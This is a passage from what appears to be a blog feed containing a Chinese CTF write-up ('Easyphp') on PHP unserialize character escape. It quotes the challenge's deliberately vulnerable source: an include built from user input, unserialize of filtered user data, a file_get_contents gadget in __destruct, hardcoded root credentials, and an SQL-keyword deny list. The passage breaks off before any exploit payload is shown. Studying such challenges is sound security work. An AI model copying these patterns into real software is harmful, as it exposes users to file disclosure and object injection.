src="https://zebra-common-system-pre.oss-cn-shanghai.aliyuncs.com/bmdev/4f1e5174-3581-4ee9-bbc9-9e1cd96ee7f2.png" alt="05.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>WP</tag>
      
      <tag>文件读取</tag>
      
      <tag>php://filter/string.strip_tags</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Easyphp</title>
    <link href="/2021/04/30/BUU80/"/>
    <url>/2021/04/30/BUU80/</url>
    
    <content type="html"><![CDATA[<h2 id="unserialize-char-escape"><a href="#unserialize-char-escape" class="headerlink" title="unserialize char-escape"></a>unserialize char-escape</h2><p><img src="https://img12.360buyimg.com/ddimg/jfs/t1/186967/37/782/447665/608c1c8bE8f062515/dd33c81b065b285b.png" alt="01.png"></p><p>没有<code>registe.php</code>     </p><p>一开始猜的是SQL注入       </p><p>注入了一会，有点想放弃了，看了下<code>www.zip</code>   </p><p>居然有     </p><p>看来不是SQLi了      </p><p>四个PHP文件    </p><p><code>index.php</code>      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span> <span class="token double-quoted-string string">"lib.php"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token constant">__DIR__</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script>window.location.href='./index.php?action=update'&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script>window.location.href='./index.php?action=login'&lt;/script>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p><code>lib.php</code>        </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'union'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'regexp'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'load'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'into'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'file'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'insert'</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"'"</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\\'</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"*"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"alter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'hacker'</span><span class="token punctuation">,</span> <span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'select id,password from user where username=?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">;</span>                <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"你的ID是"</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"你好！"</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;script>window.location.href='./update.php'&lt;/script>"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">id</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$Info</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getNewinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token variable">$Info</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$Info</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token punctuation">;</span>        <span class="token variable">$updateAction</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$Info</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"update user SET age=<span class="token interpolation"><span class="token variable">$age</span></span>,nickname=<span class="token interpolation"><span class="token variable">$nickname</span></span> where id="</span> <span class="token punctuation">.</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//这个功能还没有写完 先占坑</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getNewInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//危</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"0-0"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$nickname</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span> <span class="token operator">=</span> <span class="token variable">$nickname</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$argument</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">CtrlCase</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$argument</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$id</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$newinfo</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$newInfo</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$newInfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$upDate</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$hostname</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$database</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"test"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$mysqli</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">hostname</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dbuser</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">dbpass</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">database</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"连接失败，错误:"</span> <span class="token punctuation">.</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'s'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$idResult</span><span class="token punctuation">,</span> <span class="token variable">$passwordResult</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">token</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$idResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token single-quoted-string string">'用户不存在!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token variable">$passwordResult</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token single-quoted-string string">'密码错误！'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'token'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$idResult</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">//还没来得及写</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre></code></pre><p><code>login.php</code>      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'lib.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/html; charset=utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>login<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">margin-top</span><span class="token punctuation">:</span> 300</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>百万前端的用户信息管理系统<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>半成品系统 留后门的程序员已经跑路<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UserName<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">margin-top</span><span class="token punctuation">:</span> 20</span><span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">margin-top</span><span class="token punctuation">:</span>20<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>img/1.jpg<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>大家记得做好防护<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>img</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;br>Damn you, hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/union|select|drop|delete|insert|\#|\%|\`|\@|\\\\/i"</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Damn you, hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></code></pre></code></pre><p><code>update.php</code>       </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'lib.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;html>&lt;meta charset="utf-8">&lt;title>update&lt;/title>&lt;h2>这是一个未完成的页面，上线时建议删除本页面&lt;/h2>&lt;/html>'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"你还没有登陆呢！"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$users</span><span class="token 